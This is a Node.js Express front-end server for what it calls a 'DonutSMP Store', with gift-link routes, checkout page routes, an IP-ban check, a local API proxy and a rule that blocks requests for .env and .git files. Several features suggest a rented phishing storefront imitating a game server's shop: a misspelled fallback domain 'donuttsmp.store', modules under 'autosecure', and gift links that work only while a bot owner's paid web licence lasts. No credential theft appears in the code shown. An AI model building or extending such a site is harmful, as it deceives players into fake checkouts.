require('dotenv').config();
const { attachGlobalLoggerGuard } = require('../autosecure/utils/logging/interceptLogger');
attachGlobalLoggerGuard();

const express = require('express');
const path = require('path');
const http = require('http');
const rateLimit = require('express-rate-limit');
const config = require('../configLoader');

const { setupGlobalErrorHandlers, registerServer } = require('../autosecure/utils/process/gracefulShutdown');
setupGlobalErrorHandlers('FrontendServer');

const { getClientIp, configureTrustProxy } = require('../autosecure/utils/security/clientIp');
const { securityHeaders } = require('../autosecure/utils/security/apiAuth');

const app = express();
configureTrustProxy(app, 'edge');
app.use(securityHeaders);
app.disable('x-powered-by');
const PORT = process.env.FRONTEND_PORT || process.env.PORT || 3667;
const BACKEND_PORT = process.env.BACKEND_PORT || 5000;
const FRONTEND_DIR = path.join(__dirname, '..', 'public');

// Security Defense: Block attempts to access sensitive files (.env, .git, .json, .sqlite, .db, .log)
app.use((req, res, next) => {
    const url = req.url.toLowerCase();
    if (/\.(env|git|json|sqlite|db|log|sh|bat)(\/|\?|$)/i.test(url) || url.includes('/.env') || url.includes('/.git')) {
        return res.status(403).send('403 Forbidden');
    }
    next();
});

const staticLimiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 300,
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req) => getClientIp(req),
    message: 'Too many requests from this IP, please try again later.'
});
app.use(staticLimiter);

const { queryParams } = require('../db/database');
const { sendWebLog } = require('../autosecure/utils/webLogger');

// IP Ban Middleware
app.use(async (req, res, next) => {
    try {
        const clientIp = getClientIp(req);
        if (clientIp) {
            const banned = await queryParams('SELECT 1 FROM banned_ips WHERE ip = ?', [clientIp]);
            if (banned && banned.length > 0) {
                if (req.url.startsWith('/api')) {
                    return res.status(403).json({ success: false, error: 'Your IP has been blocked by security rules.' });
                }
                return res.status(403).send('<h1 style="text-align:center;margin-top:20%;font-family:sans-serif;">403 Forbidden - Access Denied</h1>');
            }
        }
    } catch (e) { }
    next();
});

// Forward API requests from frontend to backendServer
app.use('/api', (req, res) => {
    const clientIp = getClientIp(req);

    const proxyReq = http.request({
        hostname: '127.0.0.1',
        port: BACKEND_PORT,
        path: req.originalUrl,
        method: req.method,
        headers: {
            ...req.headers,
            'x-forwarded-for': clientIp,
            'x-forwarded-host': req.headers.host || '',
            host: `127.0.0.1:${BACKEND_PORT}`
        }
    }, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res, { end: true });
    });

    proxyReq.on('error', (err) => {
        console.error('[FRONTEND PROXY ERROR] Failed to connect to Backend:', err.message);
        res.status(502).json({ success: false, error: 'Backend API service is not available.' });
    });

    req.pipe(proxyReq, { end: true });
});

app.get('/config.js', (req, res) => {
    res.sendFile(path.join(FRONTEND_DIR, 'config.js'));
});

app.get('/health', (req, res) => {
    res.json({ success: true, service: 'frontend', time: Date.now() });
});

app.use('/assets', express.static(path.join(FRONTEND_DIR, 'assets'), {
    dotfiles: 'deny',
    maxAge: '1h'
}));
app.use('/terms', express.static(path.join(FRONTEND_DIR, 'terms'), {
    dotfiles: 'deny',
    maxAge: '1h'
}));

// Periodic cleanup of expired gift links (> 3 hours) every 5 minutes
setInterval(async () => {
    try {
        await queryParams('DELETE FROM gift_links WHERE created_at < ?', [Date.now() - 3 * 60 * 60 * 1000]);
    } catch (e) { }
}, 5 * 60 * 1000);

// Donut Gift Link Claim Routes
app.get(['/gift/:code/claim', '/gift/:code'], async (req, res) => {
    const code = req.params.code;
    const clientIp = getClientIp(req);
    const host = req.headers.host || config.webDomain || 'donuttsmp.store';
    const EXPIRY_MS = 3 * 60 * 60 * 1000; // 3 hours
    const now = Date.now();

    try {
        // 1. Dọn dẹp link cũ
        await queryParams('DELETE FROM gift_links WHERE created_at < ?', [now - EXPIRY_MS]).catch(() => { });

        // 2. Kiểm tra link có tồn tại và còn hạn không
        const rows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [code]);
        if (!rows || rows.length === 0) {
            return res.redirect('/store');
        }

        // 3. Kiểm tra bản quyền Web của người tạo link
        const linkOwnerId = rows[0].bot_user_id;
        const { checkWebAccess } = require('../autosecure/utils/web/webAccess');
        const ownerAccess = await checkWebAccess(linkOwnerId);
        if (!ownerAccess.hasAccess) {
            return res.status(403).send(`
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <title>Service Suspended - DonutSMP Store</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #0f1117; color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
        .card { background: #1a1d26; border: 1px solid #ef4444; border-radius: 16px; padding: 40px 30px; max-width: 480px; width: 100%; text-align: center; box-shadow: 0 16px 40px rgba(0,0,0,0.6); }
        .icon { font-size: 56px; margin-bottom: 16px; }
        h1 { font-size: 22px; margin: 0 0 12px; color: #f87171; font-weight: 700; }
        p { color: #9ca3af; font-size: 15px; line-height: 1.6; margin: 0 0 26px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🔒</div>
        <h1>Dịch Vụ Tạm Ngưng</h1>
        <p>Liên kết quà tặng này hiện đang tạm ngưng do gói bản quyền Web của chủ sở hữu đã hết hạn.<br><br>Vui lòng liên hệ người gửi để biết thêm chi tiết.</p>
    </div>
</body>
</html>
            `);
        }

        res.redirect(`/checkout?gift=true&code=${encodeURIComponent(code)}`);
    } catch (err) {
        console.error('[FRONTEND /gift claim] Error:', err);
        res.redirect(`/checkout?gift=true&code=${encodeURIComponent(code)}`);
    }
});

app.get('/gift', (req, res) => {
    res.redirect('/store?gift=true');
});

app.get('/', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'index.html')));
app.get('/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'index.html')));

app.get('/store', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'store.html')));
app.get('/store.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'store.html')));

app.get('/checkout', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));
app.get('/checkout.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));
app.get('/checkout/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));

app.get('/checkout/basket', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));
app.get('/checkout/basket.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));
app.get('/checkout/basket/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));

app.get('/checkout/pay', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));
app.get('/checkout/pay.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));
app.get('/checkout/pay/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));

app.get('/checkout/payment', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));
app.get('/checkout/payment.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));
app.get('/checkout/payment/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));

app.get('/checkout/packages/add/:id/:type', (req, res) => {
    res.sendFile(path.join(FRONTEND_DIR, 'checkout.html'));
});

app.get('/terms/checkout', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_checkout.html')));
app.get('/terms/impressum', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_impressum.html')));
app.get('/terms/privacy', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_privacy.html')));

app.use(express.static(FRONTEND_DIR, {
    dotfiles: 'deny'
}));

function startFrontend() {
    const server = app.listen(PORT, () => {
        if (process.env.RUN_ALL_MODE === 'true') {
            console.log(`[FRONTEND] ✓ Cổng ${PORT} sẵn sàng (Website: http://localhost:${PORT})`);
            return;
        }
        console.log(`[FRONTEND] Listening on http://localhost:${PORT}`);
    });
    registerServer(server);
}

if (require.main === module) {
    startFrontend();
}

module.exports = { app, startFrontend };
